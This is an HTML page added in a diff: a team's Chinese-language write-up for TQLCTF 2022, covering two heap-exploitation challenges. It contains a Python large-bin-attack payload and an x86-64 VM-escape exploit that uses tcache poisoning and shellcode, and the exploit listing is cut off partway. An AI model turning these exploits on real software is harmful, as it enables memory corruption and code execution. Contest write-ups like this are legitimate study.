@@ -1,0 +1,1723 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>TQLCTF 2022 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="20220306-D^3CTF.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    PKUCC战队介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    赛事writeup
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="20220627-ACTF.html">
+            
+                <a href="20220627-ACTF.html">
+            
+                    
+                    ACTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="20220320-HFCTF.html">
+            
+                <a href="20220320-HFCTF.html">
+            
+                    
+                    HFCTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="20220306-D^3CTF.html">
+            
+                <a href="20220306-D^3CTF.html">
+            
+                    
+                    D^3CTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.4" data-path="20220220-TQLCTF.html">
+            
+                <a href="20220220-TQLCTF.html">
+            
+                    
+                    TQLCTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >TQLCTF 2022</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="pkucc-tqlctf-2022-writeup">PKUCC TQLCTF 2022 Writeup</h1>
+<h2 id="pwn-unbelievablewrite">[pwn] unbelievable_write</h2>
+<p>&#x9898;&#x76EE;&#x5927;&#x610F;&#xFF1A;&#x4EFB;&#x610F;&#x591A;&#x6B21;&#x968F;&#x610F;&#x5927;&#x5C0F;&#x5185;&#x5B58;&#x5206;&#x914D;&#x3001;&#x586B;&#x5145;&#x3001;&#x91CA;&#x653E;&#xFF0C;&#x4E2D;&#x95F4;&#x63D2;&#x5165;&#x4E00;&#x6B21;&#x4EFB;&#x610F;&#x5806;&#x5730;&#x5740;&#x5185;&#x5B58;&#x91CA;&#x653E;&#xFF0C;&#x8981;&#x6C42;&#x8986;&#x5199;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;PIE&#x6CA1;&#x5F00;&#xFF0C;glibc2.31</p>
+<p>&#x6CA1;&#x5F00;PIE&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x662F;&#x7ED9;&#x5B9A;&#x5185;&#x5B58;&#x5730;&#x5740;&#x8986;&#x76D6;&#xFF0C;&#x5DF2;&#x6709;&#x7684;&#x9014;&#x5F84;&#x662F;&#x5F88;&#x591A;&#x7684;&#xFF0C;&#x4E0D;&#x8FC7;&#x552F;&#x4E00;&#x56F0;&#x96BE;&#x7684;&#x5730;&#x65B9;&#x5728;&#x4E8E;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x5DF2;&#x6709;&#x7684;&#x9014;&#x5F84;&#x662F;&#x8981;&#x6C42;&#x81F3;&#x5C11;&#x6301;&#x6709;&#x4E24;&#x5757;&#x5185;&#x5B58;&#x7684;&#xFF0C;&#x4E2D;&#x95F4;&#x8FD8;&#x53EF;&#x80FD;&#x63D2;&#x5165;&#x5176;&#x4ED6;&#x5185;&#x5B58;&#x5757;&#x9632;&#x6B62;&#x5408;&#x5E76;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x867D;&#x7136;&#x4EFB;&#x610F;&#x591A;&#x6B21;&#x5185;&#x5B58;&#x5206;&#x914D;&#xFF0C;&#x4F46;&#x662F;&#x91CA;&#x653E;&#x603B;&#x662F;&#x7D27;&#x968F;&#x5176;&#x540E;&#xFF0C;&#x5C31;&#x6CA1;&#x6CD5;&#x76F4;&#x63A5;&#x5E94;&#x7528;&#x73B0;&#x6709;&#x7684;&#x624B;&#x6BB5;&#x4E86;</p>
+<p>&#x7A0D;&#x4F5C;&#x53D8;&#x901A;&#x540E;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;large bin attack&#xFF0C;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ol>
+<li>&#x5206;&#x914D;&#x5E76;&#x91CA;&#x653E;&#x5927;&#x5C0F;&#x4E3A;0x250&#x3001;0x300&#x3001;0x350&#x5185;&#x5B58;&#x5757;&#xFF0C;&#x6CE8;&#x610F;&#x5B83;&#x4EEC;&#x91CA;&#x653E;&#x540E;&#x8FDB;&#x5165;&#x4E86;tcache&#xFF0C;&#x5185;&#x90E8;&#x6807;&#x8BB0;&#x662F;&#x201C;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x201D;&#xFF0C;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x5185;&#x5B58;&#x5408;&#x5E76;</li>
+<li>&#x586B;&#x5145;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5B58;&#x5757;&#x65F6;&#xFF0C;&#x5185;&#x90E8;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x4E3A;0x450&#x7684;&#x5185;&#x5B58;&#x5757;&#xFF0C;&#x5E76;&#x5229;&#x7528;&#x4E00;&#x6B21;&#x4EFB;&#x610F;&#x5806;&#x5730;&#x5740;&#x91CA;&#x653E;&#x7684;&#x64CD;&#x4F5C;&#x5C06;&#x5176;&#x91CA;&#x653E;&#xFF0C;&#x5B83;&#x4F1A;&#x76F4;&#x63A5;&#x8FDB;&#x5165;unsorted bin&#xFF0C;&#x4E0D;&#x7ECF;&#x8FC7;tcache</li>
+<li>&#x5206;&#x914D;&#x4E00;&#x6B21;&#x5927;&#x5C0F;&#x4E3A;0x450&#x7684;&#x5185;&#x5B58;&#x5757;&#xFF0C;&#x987A;&#x4FBF;&#x56E0;&#x4E3A;&#x5185;&#x5B58;&#x5757;&#x8DE8;&#x8FC7;&#x4E86;0x300&#x5185;&#x5B58;&#x5757;&#x7684;&#x5934;&#x90E8;&#xFF0C;&#x901A;&#x8FC7;&#x5185;&#x5B58;&#x5757;&#x586B;&#x5145;&#x628A;&#x4E4B;&#x524D;&#x91CA;&#x653E;&#x7684;0x300&#x5185;&#x5B58;&#x5757;&#x7684;&#x5927;&#x5C0F;&#x6539;&#x6210;0x440&#xFF0C;&#x8FD9;&#x4E2A;0x450&#x5185;&#x5B58;&#x5757;&#x91CA;&#x653E;&#x540E;&#x518D;&#x6B21;&#x8FDB;&#x5165;unsorted bin</li>
+<li>&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x4E3A;0x800&#x7684;&#x5185;&#x5B58;&#x5757;&#x628A;&#x4E4B;&#x524D;&#x5728;unsorted bin&#x7684;0x450&#x5185;&#x5B58;&#x5757;&#x5237;&#x5165;large bin</li>
+<li>&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x4E3A;0x250&#x7684;&#x5185;&#x5B58;&#x5757;&#xFF0C;&#x4ECE;tcache&#x4E2D;&#x76F4;&#x63A5;&#x53D6;&#x51FA;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;large bin&#x4E2D;&#x7684;&#x5927;&#x5C0F;&#x4E3A;0x450&#x7684;&#x5185;&#x5B58;&#x5757;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x628A;bk_nextsize&#x6307;&#x9488;&#x6307;&#x5411;&#x5F85;&#x8986;&#x5199;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x524D;&#x90E8;</li>
+<li>&#x518D;&#x5206;&#x914D;&#x5927;&#x5C0F;&#x4E3A;0x300&#x7684;&#x5185;&#x5B58;&#x5757;&#xFF0C;&#x4ECE;tcache&#x4E2D;&#x4E4B;&#x524D;&#x53D6;&#x51FA;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#x5DF2;&#x7ECF;&#x88AB;&#x8986;&#x76D6;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x91CA;&#x653E;&#x65F6;&#x5019;&#x4F1A;&#x88AB;&#x5F53;&#x4F5C;&#x5927;&#x5C0F;&#x4E3A;0x440&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x8FDB;&#x5165;unsorted bin</li>
+<li>&#x5206;&#x914D;&#x5927;&#x5C0F;&#x4E3A;0x900&#x7684;&#x5185;&#x5B58;&#x5757;&#x628A;&#x521A;&#x624D;&#x5927;&#x5C0F;&#x4E3A;0x440&#x7684;&#x5185;&#x5B58;&#x5757;&#x5237;&#x5165;unsorted bin&#xFF0C;&#x7531;&#x4E8E;0x440 &lt; 0x450&#xFF0C;&#x4E2D;&#x95F4;&#x7684;&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x4F2A;&#x9020;&#x4E0D;&#x4F1A;&#x6709;&#x5185;&#x5B58;&#x5757;&#x5408;&#x5E76;&#x6216;&#x62C6;&#x5206;&#xFF0C;&#x5927;&#x5C0F;&#x4E3A;0x450&#x7684;&#x5185;&#x5B58;&#x5757;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#x6211;&#x4EEC;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#xFF0C;&#x5176;bk_nextsize&#x6307;&#x5411;&#x4E86;&#x5F85;&#x8986;&#x5199;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x524D;&#x90E8;&#xFF0C;large bin attack&#x5B8C;&#x6210;&#xFF0C;&#x6307;&#x5B9A;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x88AB;&#x8986;&#x5199;</li>
+</ol>
+<p>libc&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code class="lang-c">  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size)
+      &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask (bck-&gt;bk))
+    {
+      fwd = bck;
+      bck = bck-&gt;bk;
+
+      victim-&gt;fd_nextsize = fwd-&gt;fd;
+      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+    }
+</code></pre>
+<p>pwn&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code class="lang-python"><span class="hljs-comment"># malloc(0x250) = 0x20c82c0</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x250</span>)
+print(<span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">0x20</span> + <span class="hljs-comment"># padding</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x61\x04&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">6</span> <span class="hljs-comment"># mchunk_size</span>
+        )
+
+<span class="hljs-comment"># malloc(0x300) = 0x20c8520</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x300</span>)
+print(<span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">0x220</span> + <span class="hljs-comment"># padding</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x11&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">7</span> + <span class="hljs-comment"># mchunk_size</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x11&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">7</span> <span class="hljs-comment"># mchunk_size</span>
+        )
+
+<span class="hljs-comment"># malloc(0x350) = 0x20c8830</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x350</span>)
+print(<span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">0x130</span> + <span class="hljs-comment"># padding</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x11&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">7</span> + <span class="hljs-comment"># mchunk_size</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x11&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">7</span> <span class="hljs-comment"># mchunk_size</span>
+        )
+
+<span class="hljs-comment"># now free our fake chunk</span>
+print(<span class="hljs-number">2</span>)
+print(<span class="hljs-number">0x50</span>)
+
+<span class="hljs-comment"># malloc(0x450) = 0x1d0a2f0 (our fake chunk)</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x450</span>)
+print(<span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">0x220</span> + <span class="hljs-comment"># padding</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x51\x04&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">6</span> <span class="hljs-comment"># mchunk_size</span>
+        )
+
+<span class="hljs-comment"># flush the unsorted bin</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x800</span>)
+print(<span class="hljs-string">&apos;&apos;</span>)
+
+<span class="hljs-comment"># overwrite the fake chunk header</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x250</span>)
+print(<span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">0x20</span> + <span class="hljs-comment"># padding</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># mchunk_prev_size</span>
+        <span class="hljs-string">&apos;\x61\x04&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">6</span>  + <span class="hljs-comment"># mchunk_size</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># fd</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># bk</span>
+        <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">8</span> + <span class="hljs-comment"># fd_nextsize</span>
+        <span class="hljs-string">&apos;\x60\x40\x40&apos;</span> + <span class="hljs-string">&apos;\x00&apos;</span> * <span class="hljs-number">5</span> <span class="hljs-comment"># bk_nextsize</span>
+        )
+
+<span class="hljs-comment"># get 0x300 bytes but free 0x450 bytes</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x300</span>)
+print(<span class="hljs-string">&apos;&apos;</span>)
+
+<span class="hljs-comment"># flush the unsorted bin again</span>
+print(<span class="hljs-number">1</span>)
+print(<span class="hljs-number">0x900</span>)
+print(<span class="hljs-string">&apos;&apos;</span>)
+
+<span class="hljs-comment"># finally get the flag</span>
+print(<span class="hljs-number">3</span>)
+</code></pre>
+<h2 id="pwn-ezvm">[pwn] ezvm</h2>
+<p>&#x9898;&#x76EE;&#x5927;&#x610F;&#xFF1A;&#x7528;unicorn-engine&#x4EFF;&#x771F;&#x6267;&#x884C;&#x4E00;&#x6BB5;x86_64&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x56DB;&#x4E2A;syscall hook&#x5206;&#x522B;&#x662F;read&#x3001;write&#x3001;open&#x3001;close&#xFF0C;&#x5B9E;&#x73B0;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#x6709;&#x4E00;&#x5904;&#x5B57;&#x7B26;&#x4E32;&#x62F7;&#x8D1D;&#x5355;&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#xFF0C;seccomp&#x5C4F;&#x853D;&#x4E86;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x76EE;&#x6807;&#x865A;&#x62DF;&#x673A;&#x9003;&#x9038;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;</p>
+<p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x611F;&#x89C9;&#x4E0D;&#x592A;&#x826F;&#x5FC3;</p>
+<ol>
+<li>&#x4E8C;&#x8FDB;&#x5236;strip&#x8FC7;&#xFF0C;&#x6CA1;&#x6709;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x9006;&#x5411;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x8BA8;&#x538C;&#x7684;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x521D;&#x770B;&#x4E0D;&#x77E5;&#x9053;&#x5728;&#x5E72;&#x4EC0;&#x4E48;&#xFF0C;&#x5F53;&#x7136;&#x4EE3;&#x7801;&#x89C4;&#x6A21;&#x8FD8;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;</li>
+<li>&#x6545;&#x610F;&#x5C4F;&#x853D;&#x4E86;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x6700;&#x5F00;&#x59CB;&#x6CA1;&#x6709;&#x6CE8;&#x610F;&#x76F4;&#x63A5;system(&quot;/bin/sh&quot;)&#x53D1;&#x73B0;&#x5C31;&#x662F;&#x4E0D;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x51FA;&#x9519;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x53D1;&#x73B0;&#x5199;&#x4E86;seccomp&#xFF0C;&#x800C;fork&#x51FA;&#x6765;&#x7684;&#x7A0B;&#x5E8F;&#x4E5F;&#x662F;&#x7EE7;&#x627F;&#x7684;</li>
+<li>&#x6CA1;&#x6709;&#x544A;&#x8BC9;flag&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4F46;&#x662F;flag&#x7684;&#x6587;&#x4EF6;&#x540D;&#x5C31;&#x662F;flag&#xFF0C;&#x867D;&#x7136;getdents64&#x770B;&#x4E00;&#x773C;&#x4E5F;&#x4E0D;&#x662F;&#x4E0D;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x65E2;&#x7136;&#x540D;&#x5B57;&#x778E;&#x731C;&#x90FD;&#x80FD;&#x90FD;&#x80FD;&#x731C;&#x5230;&#xFF0C;&#x4E0D;&#x5982;&#x5728;&#x9898;&#x76EE;&#x91CC;&#x8BF4;&#x4E00;&#x53E5;</li>
+<li>&#x8003;&#x5BDF;&#x70B9;&#x4E0E;unbelievable_write&#x5B58;&#x5728;&#x7C7B;&#x4F3C;&#x6216;&#x91CD;&#x590D;</li>
+</ol>
+<p>&#x6587;&#x4EF6;&#x540D;strcpy&#x7684;&#x65F6;&#x5019;&#x5355;&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x540E;&#x9762;buf&#x5730;&#x5740;&#x7684;&#x4F4E;&#x4F4D;&#x7F6E;&#x96F6;&#xFF0C;&#x800C;buf&#x7684;&#x5927;&#x5C0F;&#x5728;open&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x4E2D;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#xFF0C;&#x8FD9;&#x6837;&#x8FDE;&#x7EED;&#x5206;&#x914D;&#x591A;&#x4E2A;&#x5C0F;buf&#xFF0C;&#x518D;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5927;buf&#xFF0C;&#x7528;&#x5355;&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#x628A;&#x5927;buf&#x7684;&#x4F4E;&#x4F4D;&#x7F6E;&#x96F6;&#xFF0C;&#x5B83;&#x5C31;&#x5305;&#x542B;&#x4E86;&#x4E4B;&#x524D;&#x5C0F;buf&#x7684;&#x5934;&#x90E8;&#x5728;&#x91CC;&#x9762;&#xFF1B;&#x8FDB;&#x4E00;&#x6B65;&#x7528;read&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53EF;&#x4EE5;&#x6CC4;&#x6F0F;libc&#x5730;&#x5740;&#xFF08;&#x91CA;&#x653E;&#x5757;&#x7684;fd/bk&#x5F80;&#x5F80;&#x6307;&#x5411;main_arena&#x9644;&#x8FD1;&#xFF09;&#xFF0C;write&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5934;&#x90E8;&#x4FE1;&#x606F;</p>
+<p>&#x56E0;&#x4E3A;&#x8FD9;buf&#x5728;open&#x65F6;malloc&#xFF0C;&#x5728;close&#x65F6;free&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x9053;&#x9898;&#x76F8;&#x6BD4;unbelievable_write&#x66F4;&#x52A0;&#x81EA;&#x7531;&#xFF1B;&#x901A;&#x8FC7;&#x4FEE;&#x6539;tcache_entry&#x7684;next&#x6307;&#x9488;&#xFF0C;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x4EFB;&#x610F;&#x5185;&#x5B58;&#x5730;&#x5740;&#x5206;&#x914D;&#xFF0C;&#x6BD4;&#x5982;&#x5206;&#x914D;&#x5230;__free_hook&#x540E;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x5199;&#x5165;system&#xFF0C;&#x4E0D;&#x8FC7;&#x56E0;&#x4E3A;&#x9898;&#x76EE;&#x9650;&#x5236;&#x8FD9;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7528;</p>
+<p>&#x770B;&#x4E86;&#x4E0B;unicorn-engine&#x652F;&#x6301;JIT&#xFF0C;&#x6240;&#x4EE5;&#x627E;&#x4E00;&#x4E0B;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x53D1;&#x73B0;&#x6709;rwx&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x6BB5;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x548C;libc&#x7684;&#x504F;&#x79FB;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x91CD;&#x590D;&#x4E0A;&#x8FF0;&#x6B65;&#x9AA4;&#x53EF;&#x4EE5;&#x5411;&#x5176;&#x4E2D;&#x5199;&#x5165;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#xFF0C;&#x518D;&#x7528;__free_hook&#x8DF3;&#x8F6C;&#x8FC7;&#x53BB;&#x6267;&#x884C;&#x5373;&#x53EF;</p>
+<p>&#x6CE8;&#xFF1A;&#x4E0B;&#x9762;pwn&#x7A0B;&#x5E8F;&#x5199;&#x5F97;&#x66F4;&#x590D;&#x6742;&#x4E00;&#x4E9B;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x505A;&#x5230;&#x4E86;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x4E86;&#x6709;&#x4E00;&#x6BB5;rw&#x5185;&#x5B58;&#x6620;&#x5C04;&#x533A;&#x57DF;&#xFF08;&#x5927;&#x6982;&#x7387;&#x662F;&#x4EFF;&#x771F;&#x4EE3;&#x7801;&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF09;&#x5305;&#x542B;&#x4E86;&#x6240;&#x6709;&#x8F93;&#x5165;&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x8BD5;&#x56FE;&#x76F4;&#x63A5;&#x628A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x62F7;&#x8D1D;&#x8FDB;&#x5165;rwx&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF1B;&#x4F46;&#x662F;&#x524D;&#x8005;&#x7684;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x4F4D;&#x7F6E;&#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x4E86;heap&#x5730;&#x5740;&#x95F4;&#x63A5;&#x5F15;&#x7528;&#x627E;&#x5230;&#xFF08;&#x6211;&#x4E5F;&#x4E0D;&#x77E5;&#x9053;&#x6211;&#x5F15;&#x7528;&#x7684;heap&#x5730;&#x5740;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x7528;find&#x627E;&#x5230;&#x7684;&#xFF0C;&#x53D1;&#x73B0;&#x6BCF;&#x6B21;&#x542F;&#x52A8;&#x504F;&#x79FB;&#x56FA;&#x5B9A;&#x5C31;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;&#xFF09;</p>
+<p>pwn&#x7A0B;&#x5E8F;&#xFF1A;</p>
+<pre><code>.section &quot;.text&quot;, &quot;ax&quot;
+.code64
+_start:
+    movq $2, %rax
+    leaq str_a(%rip), %rdi
+    movq $0x90, %rsi
+    syscall # open(str_a, 0x90) = 3
+
+    movq $2, %rax
+    leaq str_b(%rip), %rdi
+    movq $0x90, %rsi
+    syscall # open(str_b, 0x90) = 4
+
+    movq $2, %rax
+    leaq str_c(%rip), %rdi
+    movq $0x90, %rsi
+    syscall # open(str_c, 0x90) = 5
+
+    movq $2, %rax
+    leaq str24_a(%rip), %rdi
+    movq $0x100, %rsi
+    syscall # open(str24_a, 0x100) = 6
+
+    xorq %rax, %rax
+    movq $6, %rdi
+    leaq buf_1(%rip), %rsi
+    movq $0x100, %rdx
+    syscall # read(6, buf_1, 0x100)
+
+    movq $3, %rax
+    movq $4, %rdi
+    syscall # close(4)
+
+    movq $3, %rax
+    movq $5, %rdi
+    syscall # close(5)
+
+    xorq %rax, %rax
+    movq $6, %rdi
+    leaq buf_2(%rip), %rsi
+    movq $0x100, %rdx
+    syscall # read(6, buf_2, 0x100)
+
+    movq buf_1 + 0x40(%rip), %rax  # &lt;main_arena+1632&gt;
+    addq $-0xc0b1e0, %rax          # rwx memory
+    movq %rax, buf_2 + 0x40(%rip)  # tcache_entry::next
+
+    movq $1, %rax
+    movq $6, %rdi
+    leaq buf_2(%rip), %rsi
+    movq $0x100, %rdx
+    syscall # write(6, buf_2, 0x100)
+
+    movq $2, %rax
+    leaq str_b(%rip), %rdi
+    movq $0x90, %rsi
+    syscall # open(str_b, 0x90) = 4
+
+    movq $2, %rax
+    leaq str_c(%rip), %rdi
+    movq $0x90, %rsi
+    syscall # open(str_c, 0x90) = 5
+
+    movq buf_1 + 0x40(%rip), %rax  # &lt;main_arena+1632&gt;
+    addq $-0xc0b0e0, %rax          # rwx memory
+    movq %rax, addr_dest(%rip)
+
+    movq buf_1 + 0x50(%rip), %rax
+    addq $-0x239e8, %rax
+    movq %rax, addr_src_p(%rip)
+
+    movq $1, %rax
+    movq $5, %rdi
+    leaq _bootstrap(%rip), %rsi
+    movq $0x90, %rdx
+    syscall # write(5, _bootstrap, 0x100)
+
